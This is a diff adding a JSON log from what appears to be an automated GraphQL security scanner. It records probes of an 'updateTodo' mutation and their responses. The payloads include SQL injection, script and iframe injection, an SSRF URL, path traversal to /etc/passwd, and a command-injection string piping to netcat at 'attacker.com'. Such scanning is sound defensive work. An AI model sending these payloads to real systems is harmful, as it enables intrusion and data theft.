@@ -1,0 +1,334 @@
+[
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(id: \"1\", input: { title: \"Task 1\", completed: false }) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.722,
+    "timestamp": "2025-09-27T16:51:11.883688Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "Task 1",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"Test' OR 1=1;-- \", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.47,
+    "timestamp": "2025-09-27T16:51:14.407433Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "Test' OR 1=1;-- ",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"<script>alert(123)</script>\", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.245,
+    "timestamp": "2025-09-27T16:51:16.275471Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "<script>alert(123)</script>",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"http://169.254.169.253/internal\", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.221,
+    "timestamp": "2025-09-27T16:51:18.249456Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "http://169.254.169.253/internal",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"test; echo 'malicious' | nc attacker.com 4444;\", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.401,
+    "timestamp": "2025-09-27T16:51:20.173930Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "test; echo 'malicious' | nc attacker.com 4444;",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"../../../../../../etc/passwd\", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.242,
+    "timestamp": "2025-09-27T16:51:22.121704Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "../../../../../../etc/passwd",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(\n    id: \"1\", \n    input: { title: \"<h1>Hacked</h1><iframe src='malicious.com'>\", completed: false }\n  ) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.415,
+    "timestamp": "2025-09-27T16:51:24.810531Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "<h1>Hacked</h1><iframe src='malicious.com'>",
+          "completed": false
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  updateTodo(id: \"1\", input: { title: \"Bypass non-aliased\", completed: false }) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.388,
+        "timestamp": "2025-09-27T16:51:27.985667Z",
+        "response_body": {
+          "data": {
+            "updateTodo": {
+              "id": "1",
+              "title": "Bypass non-aliased",
+              "completed": false
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.204,
+        "timestamp": "2025-09-27T16:51:28.189385Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "1",
+              "title": "Bypass aliased",
+              "completed": false
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-09-27T16:51:28.189413Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.396,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation updateTodo {\n  s: updateTodo(id: \"1\", input: { title: \"Bypass aliased\", completed: false }) {\n    id\n    title\n    completed\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.402,
+        "timestamp": "2025-09-27T16:51:31.164209Z",
+        "response_body": {
+          "data": {
+            "updateTodo": {
+              "id": "1",
+              "title": "Bypass non-aliased",
+              "completed": false
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.223,
+        "timestamp": "2025-09-27T16:51:31.388087Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "1",
+              "title": "Bypass aliased",
+              "completed": false
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-09-27T16:51:31.388125Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.206,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateTodo {\n    mutationType {\n      name\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.377,
+    "timestamp": "2025-09-27T16:51:34.881955Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateTodo\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateTodo(nonexistentField: true) {\n    id\n    invalidField\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.38,
+    "timestamp": "2025-09-27T16:51:38.111888Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateTodo\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
